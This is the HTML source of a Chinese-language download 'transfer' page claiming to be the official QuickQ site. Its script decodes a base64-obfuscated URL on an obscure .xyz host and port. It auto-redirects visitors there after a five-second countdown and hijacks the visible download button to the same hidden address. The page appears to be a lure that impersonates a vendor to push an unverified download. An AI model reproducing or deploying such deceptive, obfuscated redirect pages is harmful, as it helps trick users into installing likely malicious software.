<body class="transfer-page">
  <main class="transfer-card quickqc-govcn">
    <h1>资源准备中</h1>
    <p>正在校验连接环境</p>
    <p>即将进入下载页面</p>
    <p>请勿关闭当前页面</p>
    <div class="progress" aria-label="下载跳转进度"><span id="progressBar"></span></div>
    <div class="countdown"><span id="countdown">5</span> 秒后自动跳转</div>
    <a id="manualDownload" class="btn primary" href="/kexue.html" rel="nofollow noopener noreferrer">立即下载</a>
    <p class="transfer-copy">© 2026 QuickQ(中国大陆)官方网站. All Rights Reserved</p>
  </main>
  <script>
  const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9iNTUuMzEzNDg2Lnh5ejozNTg4OC8=");
  const manualDownload = document.getElementById("manualDownload");
  const progressBar = document.getElementById("progressBar");
  const countdown = document.getElementById("countdown");
  let remaining = 5;
  let progress = 0;

  const timer = window.setInterval(function () {
    progress += 20;
    remaining -= 1;
    progressBar.style.width = Math.min(progress, 100) + "%";
    countdown.textContent = Math.max(remaining, 0);

    if (remaining <= 0) {
      window.clearInterval(timer);
      window.location.replace(REAL_DOWNLOAD_URL);
    }
  }, 1000);

  manualDownload.addEventListener("click", function(e){
  e.preventDefault();
  window.location.replace(REAL_DOWNLOAD_URL);
  });
  </script>
</body>
